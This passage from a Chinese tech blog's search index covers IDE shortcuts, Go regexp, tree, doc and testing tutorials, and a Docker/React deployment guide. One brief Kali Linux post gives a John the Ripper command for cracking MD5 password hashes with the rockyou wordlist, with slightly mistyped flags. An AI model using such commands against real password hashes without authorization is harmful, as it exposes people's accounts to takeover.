Shift + [ 选择直到代码块结束 / 开始Option + Fn + Delete 删除到单词的末尾Option + Delete 删除到单词的开头Command + 加号 / Command + 减号 展开 / 折叠代码块Command + Shift + 加号 展开所以代码块Command + Shift + 减号 折叠所有代码块Command + W 关闭活动的编辑器选项卡 Part 2：Search / Replace（查询/替换） 12345678910快捷键 作用Double Shift 查询任何东西Command + F 文件内查找Command + G 查找模式下，向下查找Command + Shift + G 查找模式下，向上查找Command + R 文件内替换Command + Shift + F 全局查找（根据路径）Command + Shift + R 全局替换（根据路径）Command + Shift + S 查询结构（Ultimate Edition 版专用，需要在 Keymap 中设置）Command + Shift + M 替换结构（Ultimate Edition 版专用，需要在 Keymap 中设置） Part 3：Usage Search（使用查询） 1234快捷键 作用Option + F7 / Command + F7 在文件中查找用法 / 在类中查找用法Command + Shift + F7 在文件中突出显示的用法Command + Option + F7 显示用法 Part 4：Compile and Run（编译和运行） 12345678快捷键 作用Command + F9 编译 ProjectCommand + Shift + F9 编译选择的文件、包或模块Control + Option + R 弹出 Run 的可选择菜单Control + Option + D 弹出 Debug 的可选择菜单Control + R 运行Control + D 调试Control + Shift + R, Control + Shift + D 从编辑器运行上下文环境配置 Part 5：Debugging（调试） 1234567891011121314151617181920212223242526272829303132333435363738394041424344快捷键 作用F8 进入下一步，如果当前行断点是一个方法，则不进入当前方法体内F7 进入下一步，如果当前行断点是一个方法，则进入当前方法体内，如果该方法体还有方法，则不会进入该内嵌的方法中Shift + F7 智能步入，断点所在行上有多个方法调用，会弹出进入哪个方法Shift + F8 跳出Option + F9 运行到光标处，如果光标前有其他断点会进入到该断点Option + F8 计算表达式（可以更改变量值使其生效）Command + Option + R 恢复程序运行，如果该断点下面代码还有断点则停在下一个断点上Command + F8 切换断点（若光标当前行有断点则取消断点，没有则加上断点）Command + Shift + F8 查看断点信息Part 6：Navigation（导航）快捷键 作用Command + O 查找类文件Command + Shift + O 查找所有类型文件、打开文件、打开目录，打开目录需要在输入的内容前面或后面加一个反斜杠/Command + Option + O 前往指定的变量 / 方法Control + 方向键左 / Control + 方向键右 左右切换打开的编辑 tab 页F12 返回到前一个工具窗口Esc 从工具窗口进入代码文件窗口Shift + Esc 隐藏当前或最后一个活动的窗口，且光标进入代码文件窗口Command + Shift + F4 关闭活动 run/messages/find/... tabCommand + L 在当前文件跳转到某一行的指定处Command + E 显示最近打开的文件记录列表Option + 方向键左 / Option + 方向键右 光标跳转到当前单词 / 中文句的左 / 右侧开头位置Command + Option + 方向键左 / Command + Option + 方向键右 退回 / 前进到上一个操作的地方Command + Shift + Delete 跳转到最后一个编辑的地方Option + F1 显示当前文件选择目标弹出层，弹出层中有很多目标可以进行选择(如在代码编辑窗口可以选择显示该文件的 Finder)Command + B / Command + 鼠标点击 进入光标所在的方法/变量的接口或是定义处Command + Option + B 跳转到实现处，在某个调用的方法名上使用会跳到具体的实现处，可以跳过接口Option + Space, Command + Y 快速打开光标所在方法、类的定义Control + Shift + B 跳转到类型声明处Command + U 前往当前光标所在方法的父类的方法 / 接口定义Control + 方向键下 / Control + 方向键上 当前光标跳转到当前文件的前一个 / 后一个方法名位置Command + ] / Command + [ 移动光标到当前所在代码的花括号开始 / 结束位置Command + F12 弹出当前文件结构层，可以在弹出的层上直接输入进行筛选（可用于搜索类中的方法）Control + H 显示当前类的层次结构Command + Shift + H 显示方法层次结构Control + Option + H 显示调用层次结构F2 / Shift + F2 跳转到下一个 / 上一个突出错误或警告的位置F4 / Command + 方向键下 编辑 / 查看代码源Option + Home 显示到当前文件的导航条F3 选中文件 / 文件夹 / 代码行，添加 / 取消书签Option + F3 选中文件 / 文件夹/代码行，使用助记符添加 / 取消书签Control + 0…Control + 9 定位到对应数值的书签位置Command + F3 显示所有书签 Part 7：Refactoring（重构） 123456789101112快捷键 作用F5 复制文件到指定目录F6 移动文件到指定目录Command + Delete 在文件上为安全删除文件，弹出确认框Shift + F6 重命名文件Command + F6 更改签名Command + Option + N 一致性Command + Option + M 将选中的代码提取为方法Command + Option + V 提取变量Command + Option + F 提取字段Command + Option + C 提取常量Command + Option + P 提取参数 Part 8：VCS / Local History（版本控制 / 本地历史记录） 12345快捷键 作用Command + K 提交代码到版本控制器Command + T 从版本控制器更新代码Option + Shift + C 查看最近的变更记录Control + C 快速弹出版本控制器操作面板 Part 9：Live Templates（动态代码模板） 123快捷键 作用Command + Option + J 弹出模板选择窗口，将选定的代码使用动态模板包住Command + J 插入自定义动态代码模板 Part 10：General（通用） 12345678910111213快捷键 作用Command + 1…Command + 9 打开相应编号的工具窗口Command + S 保存所有Command + Option + Y 同步、刷新Control + Command + F 切换全屏模式Command + Shift + F12 切换最大化编辑器Option + Shift + F 添加到收藏夹Option + Shift + I 检查当前文件与当前的配置文件Control + ` 快速切换当前的 scheme（切换主题、代码样式等）Command + , 打开 IDEA 系统设置Command + ; 打开项目结构对话框Shift + Command + A 查找动作（可设置相关选项）Control + Shift + Tab 编辑窗口标签和工具窗口之间切换（如果在切换的过程加按上 delete，则是关闭对应选中的窗口","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[68]-正则表达式支持","slug":"golang-67-regexp","date":"2019-03-04T15:45:34.000Z","updated":"2019-03-04T15:46:39.898Z","comments":true,"path":"2019/03/04/golang-67-regexp/","link":"","permalink":"https://dreamerjonson.com/2019/03/04/golang-67-regexp/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package mainimport \"bytes\"import \"fmt\"import \"regexp\"func main() &#123; // 是否匹配 match, _ := regexp.MatchString(\"p([a-z]+)ch\", \"peach\") fmt.Println(match) // 上面我们直接使用了字符串模式，但是其他的regexp的任务你需要编写一个` `//` regexp `结构优化。 r, _ := regexp.Compile(\"p([a-z]+)ch\") // 此结构体有很多方法，如何上面一样的匹配 fmt.Println(r.MatchString(\"peach\")) // 查找 fmt.Println(r.FindString(\"peach punch\")) // 查找第一个匹配的位置 fmt.Println(r.FindStringIndex(\"peach punch\")) // 全局和括号里面的子集 // for both `p([a-z]+)ch` and `([a-z]+)`. fmt.Println(r.FindStringSubmatch(\"peach punch\"))// 全局和括号里面的子集的序号 fmt.Println(r.FindStringSubmatchIndex(\"peach punch\")) // 发现所有匹配的 fmt.Println(r.FindAllString(\"peach punch pinch\", -1)) // 也适用于子集 fmt.Println(r.FindAllStringSubmatchIndex( \"peach punch pinch\", -1)) // 第2个参数限制匹配的数量 fmt.Println(r.FindAllString(\"peach punch pinch\", 2)) // 字符数组也可以 fmt.Println(r.Match([]byte(\"peach\")))// 当用正则表达式创建常量时你可以使用mustcompile变化编译。 r = regexp.MustCompile(\"p([a-z]+)ch\") fmt.Println(r) // 替换 fmt.Println(r.ReplaceAllString(\"a peach\", \"&lt;fruit&gt;\")) // 自定义替换方式 in := []byte(\"a peach\") out := r.ReplaceAllFunc(in, bytes.ToUpper) fmt.Println(string(out))&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"kali-linux","slug":"kali-linux","date":"2019-03-04T13:52:06.000Z","updated":"2019-03-04T13:55:06.935Z","comments":true,"path":"2019/03/04/kali-linux/","link":"","permalink":"https://dreamerjonson.com/2019/03/04/kali-linux/","excerpt":"","text":"下载：https://www.kali.org/ 下载：https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/ john 破解MD5 123&gt; locate rockyou.txt&gt; gzip –d rockyou.text.gz&gt; john --worklist=rockyou.text.gz --format=raw-md5 passw.txt","categories":[{"name":"kali-linux","slug":"kali-linux","permalink":"https://dreamerjonson.com/categories/kali-linux/"}],"tags":[{"name":"kali-linux","slug":"kali-linux","permalink":"https://dreamerjonson.com/tags/kali-linux/"}]},{"title":"golang[7]-数据结构-树的生成与遍历与通道遍历","slug":"golang-7-structure-tree","date":"2019-03-03T03:39:45.000Z","updated":"2019-03-03T04:01:37.921Z","comments":true,"path":"2019/03/03/golang-7-structure-tree/","link":"","permalink":"https://dreamerjonson.com/2019/03/03/golang-7-structure-tree/","excerpt":"","text":"node.go 节点的结构、打印节点、设置节点、遍历节点与通道遍历 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package treeimport \"fmt\"type Node struct &#123; Value int Left, Right *Node&#125;func (node Node) Print() &#123; fmt.Print(node.Value, \" \")&#125;func (node *Node) SetValue(value int) &#123; if node == nil &#123; fmt.Println(\"Setting Value to nil \" + \"node. Ignored.\") return &#125; node.Value = value&#125;func CreateNode(value int) *Node &#123; return &amp;Node&#123;Value: value&#125;&#125;func (node *Node) Traverse() &#123; node.TraverseFunc(func(n *Node) &#123; n.Print() &#125;) fmt.Println()&#125;func (node *Node) TraverseFunc(f func(*Node)) &#123; if node == nil &#123; return &#125; node.Left.TraverseFunc(f) f(node) node.Right.TraverseFunc(f)&#125;func (node *Node) TraverseWithChannel() chan *Node &#123; out := make(chan *Node) go func() &#123; node.TraverseFunc(func(node *Node) &#123; out &lt;- node &#125;) close(out) &#125;() return out&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package mainimport ( \"fmt\" \"github/dreamjonson/tree\")type myTreeNode struct &#123; node *tree.Node&#125;func (myNode *myTreeNode) postOrder() &#123; if myNode == nil || myNode.node == nil &#123; return &#125; left := myTreeNode&#123;myNode.node.Left&#125; right := myTreeNode&#123;myNode.node.Right&#125; left.postOrder() right.postOrder() myNode.node.Print()&#125;func main() &#123; //生成树 var root tree.Node root = tree.Node&#123;Value: 3&#125; root.Left = &amp;tree.Node&#123;&#125; root.Right = &amp;tree.Node&#123;5, nil, nil&#125; root.Right.Left = new(tree.Node) root.Left.Right = tree.CreateNode(2) root.Right.Left.SetValue(4) //遍历树 fmt.Print(\"In-order traversal: \") root.Traverse() //遍历树2 fmt.Print(\"My own post-order traversal: \") myRoot := myTreeNode&#123;&amp;root&#125; myRoot.postOrder() fmt.Println() //统计节点数量 nodeCount := 0 root.TraverseFunc(func(node *tree.Node) &#123; nodeCount++ &#125;) fmt.Println(\"Node count:\", nodeCount) //通道遍历树 c := root.TraverseWithChannel() maxNodeValue := 0 for node := range c &#123; if node.Value &gt; maxNodeValue &#123; maxNodeValue = node.Value &#125; &#125; fmt.Println(\"Max node value:\", maxNodeValue)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[67]-go语言生成文档注释","slug":"golang-67-document","date":"2019-03-02T09:21:53.000Z","updated":"2019-03-02T09:25:44.434Z","comments":true,"path":"2019/03/02/golang-67-document/","link":"","permalink":"https://dreamerjonson.com/2019/03/02/golang-67-document/","excerpt":"","text":"写文档注释 12345678910111213141516171819202122package queue// A FIFO queue.type Queue []int// Pushes the element into the queue.// e.g. q.Push(123)func (q *Queue) Push(v int) &#123; *q = append(*q, v)&#125;// Pops element from head.func (q *Queue) Pop() int &#123; head := (*q)[0] *q = (*q)[1:] return head&#125;// Returns if the queue is empty or not.func (q *Queue) IsEmpty() bool &#123; return len(*q) == 0&#125; 查看文档 1go doc 生成文档 1godoc -http :6060 生成文档注释 queue_test.go 12345678910111213141516171819202122package queueimport \"fmt\"func ExampleQueue_Pop() &#123; q := Queue&#123;1&#125; q.Push(2) q.Push(3) fmt.Println(q.Pop()) fmt.Println(q.Pop()) fmt.Println(q.IsEmpty()) fmt.Println(q.Pop()) fmt.Println(q.IsEmpty()) // Output: // 1 // 2 // false // 3 // true&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[66]-test测试","slug":"golang-66-test","date":"2019-03-01T02:26:31.000Z","updated":"2019-03-05T03:39:00.246Z","comments":true,"path":"2019/03/01/golang-66-test/","link":"","permalink":"https://dreamerjonson.com/2019/03/01/golang-66-test/","excerpt":"","text":"go test 123go test是一个按照一定的约定和组织的测试代码的驱动程序.在包目录内,以_test.go为后缀名的源文件并不是go build构建包的以部分,它们是go test测试的一部分.早*_test.go文件中,有三种类型的函数:测试函数,基准测试函数,例子函数.一个测试函数是以Test为函数名前缀的函数,用于测试程序的一些逻辑行为是否正确; go test会调用这些测试函数并报告测试结果是PASS或FAIL.基准测试函数是以Benchmark为函数名前缀的函数,用于衡量一些函数的性能; go test会多次运行基准函数以计算一个平均的执行时间.例子函数是以Example为函数名前缀的函数,提供一个由机器检测正确性的例子文档go test命令会遍历所有的*_test.go文件中上述函数,然后生成一个临时的main包调用相应的测试函数,然后构建并运行,报告测试结果,最后清理临时文件. 测试函数 每个测试函数必须导入testing 包. 测试函数有如下的签名: 123func TestName(t *testing.T) &#123; // ...&#125; 测试函数的名字必须以Test开头, 可选的后缀名必须以大写字母开头: 123func TestSin(t *testing.T) &#123; /* ... */ &#125;func TestCos(t *testing.T) &#123; /* ... */ &#125;func TestLog(t *testing.T) &#123; /* ... */ &#125; 其中t 参数用于报告测试失败和附件的日志信息. 让我们顶一个一个实例包gopl.io/ch11/word1, 只有一个函数IsPalindrome 用于检查一个字符串是否从前向后和从后向前读都一样. (这个实现对于一个字符串是否是回文字符串前后重复测试了两次; 我们稍后会再讨论这个问题.) 12345678910111213// Package word provides utilities for word games.package word// IsPalindrome reports whether s reads the same forward and backward.// (Our first attempt.)func IsPalindrome(s string) bool &#123; for i := range s &#123; if s[i] != s[len(s)-1-i] &#123; return false &#125; &#125; return true&#125; 在相同的目录下, word_test.go 文件包含了TestPalindrome 和TestNonPalindrome 两个测试函数. 每一个都是测试IsPalindrome 是否给出正确的结果, 并使用t.Error 报告失败: 123456789101112131415161718package wordimport &quot;testing&quot;func TestPalindrome(t *testing.T) &#123; if !IsPalindrome(&quot;detartrated&quot;) &#123; t.Error(`IsPalindrome(&quot;detartrated&quot;) = false`) &#125; if !IsPalindrome(&quot;kayak&quot;) &#123; t.Error(`IsPalindrome(&quot;kayak&quot;) = false`) &#125;&#125;func TestNonPalindrome(t *testing.T) &#123; if IsPalindrome(&quot;palindrome&quot;) &#123; t.Error(`IsPalindrome(&quot;palindrome&quot;) = true`) &#125;&#125; go test(或go build)命令如果没有参数指定包那么将默认采用当前目录对应的包.我们可以用下面的命令构建和运行测试. $ cd GOPATH/src/gopl.io/ch11/word1GOPATH/src/gopl.io/ch11/word1 GOPATH/src/gopl.io/ch11/word1 go test ok gopl.io/ch11/word1 0.008s 还比较满意, 我们运行了这个程序, 不过没有提前退出是因为还没有遇到BUG报告. 一个法国名为Noelle Eve Elleon 的用户抱怨IsPalindrome 函数不能识别’‘été.’’. 另外一个来自美国中部用户的抱怨是不能识别’‘A man, a plan, a canal: Panama.’’. 执行特殊和小的BUG报告为我们提供了新的更自然的测试用例. 123456789101112func TestFrenchPalindrome(t *testing.T) &#123; if !IsPalindrome(&quot;été&quot;) &#123; t.Error(`IsPalindrome(&quot;été&quot;) = false`) &#125;&#125;func TestCanalPalindrome(t *testing.T) &#123; input := &quot;A man, a plan, a canal: Panama&quot; if !IsPalindrome(input) &#123; t.Errorf(`IsPalindrome(%q) = false`, input) &#125;&#125; 为了避免两次输入较长的字符串, 我们使用了提供了有类似Printf 格式化功能的Errorf 函数来汇报错误结果. 当添加了这两个测试用例之后, go test返回了测试失败的信息. 1234567$ go test--- FAIL: TestFrenchPalindrome (0.00s) word_test.go:28: IsPalindrome(&quot;été&quot;) = false--- FAIL: TestCanalPalindrome (0.00s) word_test.go:35: IsPalindrome(&quot;A man, a plan, a canal: Panama&quot;) = falseFAILFAIL gopl.io/ch11/word1 0.014s 先编写测试用例并观察到测试用例触发了和用户报告的错误相同的描述是一个好的测试习惯. 只有这样, 我们才能定位我们要眞正解决的问题. 先写测试用例的另好处是, 运行测试通常会比手工描述报告的处理更快, 这让我们可以进行快速地迭代. 如果测试集有很多运行缓慢的测试, 我们可以通过只选择运行某些特定的测试来加快测试速度. 参数-v用于打印每个测试函数的名字和运行时间: 1234567891011121314$ go test -v=== RUN TestPalindrome--- PASS: TestPalindrome (0.00s)=== RUN TestNonPalindrome--- PASS: TestNonPalindrome (0.00s)=== RUN TestFrenchPalindrome--- FAIL: TestFrenchPalindrome (0.00s) word_test.go:28: IsPalindrome(&quot;été&quot;) = false=== RUN TestCanalPalindrome--- FAIL: TestCanalPalindrome (0.00s) word_test.go:35: IsPalindrome(&quot;A man, a plan, a canal: Panama&quot;) = falseFAILexit status 1FAIL gopl.io/ch11/word1 0.017s 参数-run是一个正则表达式,只有测试函数名被它正确匹配的测试函数才会被go test运行: 12345678910$ go test -v -run=&quot;French|Canal&quot;=== RUN TestFrenchPalindrome--- FAIL: TestFrenchPalindrome (0.00s) word_test.go:28: IsPalindrome(&quot;été&quot;) = false=== RUN TestCanalPalindrome--- FAIL: TestCanalPalindrome (0.00s) word_test.go:35: IsPalindrome(&quot;A man, a plan, a canal: Panama&quot;) = falseFAILexit status 1FAIL gopl.io/ch11/word1 0.014s 当然,一旦我们已经修复了失败的测试用例,在我们提交代码更新之前,我们应该以不带参数的go test命令运行全部的测试用例,以确保更新没有引入新的问题. 我们现在的任务就是修复这些错误. 简要分析后发现第一个BUG的原因是我们采用了byte 而不是rune 序列, 所以像&quot;été&quot; 中的é 等非ASCII 字符不能正确处理. 第二个BUG是因为没有忽略空格和字母的大小写导致的. 针对上述两个BUG, 我们仔细重写了函数: 12345678910111213141516171819202122gopl.io/ch11/word2// Package word provides utilities for word games.package wordimport &quot;unicode&quot;// IsPalindrome reports whether s reads the same forward and backward.// Letter case is ignored, as are non-letters.func IsPalindrome(s string) bool &#123; var letters []rune for _, r := range s &#123; if unicode.IsLetter(r) &#123; letters = append(letters, unicode.ToLower(r)) &#125; &#125; for i := range letters &#123; if letters[i] != letters[len(letters)-1-i] &#123; return false &#125; &#125; return true&#125; 同时我们也将之前的所有测试数据合并到了一个测试中的表格中. 12345678910111213141516171819202122232425func TestIsPalindrome(t *testing.T) &#123; var tests = []struct &#123; input string want bool &#125;&#123; &#123;&quot;&quot;, true&#125;, &#123;&quot;a&quot;, true&#125;, &#123;&quot;aa&quot;, true&#125;, &#123;&quot;ab&quot;, false&#125;, &#123;&quot;kayak&quot;, true&#125;, &#123;&quot;detartrated&quot;, true&#125;, &#123;&quot;A man, a plan, a canal: Panama&quot;, true&#125;, &#123;&quot;Evil I did dwell; lewd did I live.&quot;, true&#125;, &#123;&quot;Able was I ere I saw Elba&quot;, true&#125;, &#123;&quot;été&quot;, true&#125;, &#123;&quot;Et se resservir, ivresse reste.&quot;, true&#125;, &#123;&quot;palindrome&quot;, false&#125;, // non-palindrome &#123;&quot;desserts&quot;, false&#125;, // semi-palindrome &#125; for _, test := range tests &#123; if got := IsPalindrome(test.input); got != test.want &#123; t.Errorf(&quot;IsPalindrome(%q) = %v&quot;, test.input, got) &#125; &#125;&#125; 我们的新测试阿都通过了: $ go test gopl.io/ch11/word2 ok gopl.io/ch11/word2 0.015s 这种表格驱动的测试在Go中很常见的. 我们很容易想表格添加新的测试数据, 并且后面的测试逻辑也没有冗余, 这样我们可以更好地完善错误信息. 失败的测试的输出并不包括调用t.Errorf 时刻的堆栈调用信息. 不像其他语言或测试框架的assert 断言, t.Errorf 调用也没有引起panic 或停止测试的执行. 卽使表格中前面的数据导致了测试的失败, 表格后面的测试数据依然会运行测试, 因此在一个测试中我们可能了解多个失败的信息. 如果我们眞的需要停止测试, 或许是因为初始化失败或可能是早先的错误导致了后续错误等原因, 我们可以使用t.Fatal 或t.Fatalf 停止测试. 它们必须在和测试函数同一个goroutine 内调用. 测试失败的信息一般的形式是&quot;f(x) = y, want z&quot;, f(x) 解释了失败的操作和对应的输出, y 是实际的运行结果, z 是期望的正确的结果. 就像前面检查回文字符串的例子, 实际的函数用于f(x) 部分. 如果显示x 是表格驱动型测试中比较重要的部分, 因为同一个断言可能对应不同的表格项执行多次. 要避免无用和冗余的信息. 在测试类似IsPalindrome 返回布尔类型的函数时, 可以忽略并没有额外信息的z 部分. 如果x, y 或z 是y 的长度, 输出一个相关部分的简明总结卽可. 测试的作者应该要努力帮助程序员诊断失败的测试. basic.go 12345func calcTriangle(a, b int) int &#123; var c int c = int(math.Sqrt(float64(a*a + b*b))) return c&#125; triangle_test.go 123456789101112131415161718192021package mainimport \"testing\"func TestTriangle(t *testing.T) &#123; tests := []struct&#123; a, b, c int &#125;&#123; &#123;3, 4, 5&#125;, &#123;5, 12, 13&#125;, &#123;8, 15, 17&#125;, &#123;12, 35, 37&#125;, &#123;30000, 40000, 50000&#125;, &#125; for _, tt := range tests &#123; if actual := calcTriangle(tt.a, tt.b); actual != tt.c &#123; t.Errorf(\"calcTriangle(%d, %d); \"+ \"got %d; expected %d\", tt.a, tt.b, actual, tt.c) &#125; &#125;&#125; noreactping_test.go 12345678910111213141516171819202122232425262728293031323334package mainimport \"testing\"func TestSubstr(t *testing.T) &#123; tests := []struct &#123; s string ans int &#125;&#123; // Normal cases &#123;\"abcabcbb\", 3&#125;, &#123;\"pwwkew\", 3&#125;, // Edge cases &#123;\"\", 0&#125;, &#123;\"b\", 1&#125;, &#123;\"bbbbbbbbb\", 1&#125;, &#123;\"abcabcabcd\", 4&#125;, // Chinese support &#123;\"这里是慕课网\", 6&#125;, &#123;\"一二三二一\", 3&#125;, &#123;\"黑化肥挥发发灰会花飞灰化肥挥发发黑会飞花\", 8&#125;, &#125; for _, tt := range tests &#123; actual := lengthOfNonRepeatingSubStr(tt.s) if actual != tt.ans &#123; t.Errorf(\"got %d for input %s; \"+ \"expected %d\", actual, tt.s, tt.ans) &#125; &#125;&#125; 随机测试 表格驱动的测试便于构造基于精心挑选的测试数据的测试用例. 另一种测试思路是随机测试, 也就是通过构造更广泛的随机输入来测试探索函数的行为. 那么对于一个随机的输入, 我们如何能知道希望的输出结果呢? 这里有两种策略. 第一个是编写另一个函数, 使用简单和清晰的算法, 虽然效率较低但是行为和要测试的函数一致, 然后针对相同的随机输入检查两者的输出结果. 第二种是生成的随机输入的数据遵循特定的模式, 这样我们就可以知道期望的输出的模式. 下面的例子使用的是第二种方法: randomPalindrome 函数用于随机生成回文字符串. 1234567891011121314151617181920212223242526272829import \"math/rand\"// randomPalindrome returns a palindrome whose length and contents// are derived from the pseudo-random number generator rng.func randomPalindrome(rng *rand.Rand) string &#123; n := rng.Intn(25) // random length up to 24 runes := make([]rune, n) for i := 0; i &lt; (n+1)/2; i++ &#123; r := rune(rng.Intn(0x1000)) // random rune up to '\\u0999' runes[i] = r runes[n-1-i] = r &#125; return string(runes)&#125;func TestRandomPalindromes(t *testing.T) &#123; // Initialize a pseudo-random number generator. seed := time.Now().UTC().UnixNano() t.Logf(\"Random seed: %d\", seed) rng := rand.New(rand.NewSource(seed)) for i := 0; i &lt; 1000; i++ &#123; p := randomPalindrome(rng) if !IsPalindrome(p) &#123; t.Errorf(\"IsPalindrome(%q) = false\", p) &#125; &#125;&#125; 虽然随机测试有不确定因素, 但是它也是至关重要的, 我们可以从失败测试的日志获取足够的信息. 在我们的例子中, 输入IsPalindrome 的p 参数将告诉我们眞实的数据, 但是对于函数将接受更复杂的输入, 不需要保存所有的输入, 只要日志中简单地记录随机数种子卽可(像上面的方式). 有了这些随机数初始化种子, 我们可以很容易修改测试代码以重现失败的随机测试. 通过使用当前时间作为随机种子, 在整个过程中的每次运行测试命令时都将探索新的随机数据. 如果你使用的是定期运行的自动化测试集成系统, 随机测试将特别有价值. 测试代码覆盖率 12go test -coverprofile=c.outgo tool cover -html=c.out 性能测试 同一个函数执行N多次。 123456789101112131415161718192021222324252627282930313233343536func BenchmarkSubstr(b *testing.B) &#123; s := &quot;黑化肥挥发发灰会花飞灰化肥挥发发黑会飞花&quot; //for i := 0; i &lt; 13; i++ &#123; // s = s + s //&#125; //b.Logf(&quot;len(s) = %d&quot;, len(s)) ans := 8 //b.ResetTimer() for i := 0; i &lt; b.N; i++ &#123; actual := lengthOfNonRepeatingSubStr(s) if actual != ans &#123; b.Errorf(&quot;got %d for input %s; &quot;+ &quot;expected %d&quot;, actual, s, ans) &#125; &#125;&#125;func lengthOfNonRepeatingSubStr(s string) int &#123; lastOccurred := make(map[rune]int) start := 0 maxLength := 0 for i, ch := range []rune(s) &#123; if lastI, ok := lastOccurred[ch]; ok &amp;&amp; lastI &gt;= start &#123; start = lastI + 1 &#125; if i-start+1 &gt; maxLength &#123; maxLength = i - start + 1 &#125; lastOccurred[ch] = i &#125; return maxLength&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"docker[4]-front","slug":"docker-front","date":"2019-02-26T09:46:42.000Z","updated":"2019-04-28T02:44:18.303Z","comments":true,"path":"2019/02/26/docker-front/","link":"","permalink":"https://dreamerjonson.com/2019/02/26/docker-front/","excerpt":"","text":"创建react应用并用vscode打开 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950$ create-react-app frontendCreating a new React app in /Users/jackson/Downloads/frontend.Installing packages. This might take a couple of minutes.Installing react, react-dom, and react-scripts...&gt; fsevents@1.2.7 install /Users/jackson/Downloads/frontend/node_modules/chokidar/node_modules/fsevents&gt; node install[fsevents] Success: &quot;/Users/jackson/Downloads/frontend/node_modules/chokidar/node_modules/fsevents/lib/binding/Release/node-v64-darwin-x64/fse.node&quot; is installed via remote&gt; fsevents@1.2.4 install /Users/jackson/Downloads/frontend/node_modules/fsevents&gt; node install[fsevents] Success: &quot;/Users/jackson/Downloads/frontend/node_modules/fsevents/lib/binding/Release/node-v64-darwin-x64/fse.node&quot; already installedPass --update-binary to reinstall or --build-from-source to recompile+ react@16.8.3+ react-scripts@2.1.5+ react-dom@16.8.3added 1948 packages from 733 contributors and audited 36230 packages in 147.639sfound 63 low severity vulnerabilities run `npm audit fix` to fix them, or `npm audit` for detailsInitialized a git repository.Success! Created frontend at /Users/jackson/Downloads/frontendInside that directory, you can run several commands: npm start Starts the development server. npm run build Bundles the app into static files for production. npm test Starts the test runner. npm run eject Removes this tool and copies build dependencies, configuration files and scripts into the app directory. If you do this, you can’t go back!We suggest that you begin by typing: cd frontend npm startHappy hacking!jacksondeMacBook-Pro:Downloads jackson$ code frontend 新建Dockerfile.dev 123456789FROM node:alpineWORKDIR &apos;/app&apos;COPY package.json .RUN npm installCOPY . .CMD [&quot;npm&quot;,&quot;run&quot;,&quot;start&quot;] 删除node_moudles 构建 1234567891011121314151617181920$ docker build -f Dockerfile.dev .Sending build context to Docker daemon 914.9kBStep 1/6 : FROM node:alpine ---&gt; 4e50ad7c0e0bStep 2/6 : WORKDIR &apos;/app&apos; ---&gt; Using cache ---&gt; e99f36e2e99dStep 3/6 : COPY package.json . ---&gt; Using cache ---&gt; c5c9213cbf46Step 4/6 : RUN npm install ---&gt; Using cache ---&gt; a770342ca69aStep 5/6 : COPY . . ---&gt; 7c0e4f289ad5Step 6/6 : CMD [&quot;npm&quot;,&quot;run&quot;,&quot;start&quot;] ---&gt; Running in c9fd7f9cfbbeRemoving intermediate container c9fd7f9cfbbe ---&gt; 80bf791492c9Successfully built 80bf791492c9 运行 12345678910111213141516$ docker run -p 3000:3000 80bf791492c9&gt; frontend@0.1.0 start /app&gt; react-scripts startStarting the development server...Compiled successfully!You can now view frontend in the browser. Local: http://localhost:3000/ On Your Network: http://172.17.0.2:3000/Note that the development build is not optimized.To create a production build, use npm run build. 访问 打开浏览器访问localhost:3000即可访问react首页 123456789If you are running on Windows, please read this: Create-React-App has some issues detecting when files get changed on Windows based machines. To fix this, please do the following:In the root project directory, create a file called .envAdd the following text to the file and save it: CHOKIDAR_USEPOLLING=trueThat&apos;s all!For more on why this is required, you can check out: https://facebook.github.io/create-react-app/docs/troubleshooting#npm-start-doesn-t-detect-changes 如果要修改react首页的App.js，我们不希望从新生成image。 其中(pwd)代表当前路径 (pwd):/app代表当前路径映射到container中的/app -v /app/node_modules 代表使用container中的node_moudles 12345678910111213141516$ docker run -p 3000:3000 -v /app/node_modules -v $(pwd):/app 80bf791492c9&gt; frontend@0.1.0 start /app&gt; react-scripts startStarting the development server...Compiled successfully!You can now view frontend in the browser. Local: http://localhost:3000/ On Your Network: http://172.17.0.2:3000/Note that the development build is not optimized.To create a production build, use npm run build. 测试第一种方式 123456789测试：docker build -f Dockerfile.dev .docker run -it d0ec57f38348 npm run test动态测试的一种方式：docker-compose up新开一个窗口，与已经在docker中的container交互：docker exec -it d0ec57f38348 npm run test 测试第二个方式 创建一个服务器，单独用于测试 修改docker-compose.yml： 12345678910111213141516171819version: &apos;3&apos;services: web: build: context: . dockerfile: Dockerfile.dev ports: - &quot;3000:3000&quot; volumes: - /app/node_modules - .:/app tests: build: context: . dockerfile: Dockerfile.dev volumes: - /app/node_modules - .:/app command: [&quot;npm&quot;,&quot;run&quot;,&quot;test&quot;] 生产环境 生产环境运行nginx服务器，将build文件夹下的所有文件都复制到nginx中 Dockerfile 12345678910FROM node:alpine as builderWORKDIR &apos;/app&apos;COPY package*.json ./RUN npm installCOPY . .RUN npm run buildFROM nginx EXPOSE 80COPY --from=builder /app/build /usr/share/nginx/html 运行nginx go build . go run -p 8080:80 7912f8a3f73e 部署到github 123456git initgit add README.mdgit add .git commit -m &quot;first commit&quot;git remote add origin https://github.com/dreamerjackson/docker-react-aws.gitgit push -u origin master .travis.yml Travis CI 123456789sudo: requiredservices:- dockerbefore_install:- docker build -t stephengrider/docker-react -f Dockerfile.dev .script:- docker run stephengrider/docker-react npm run test -- --coverage 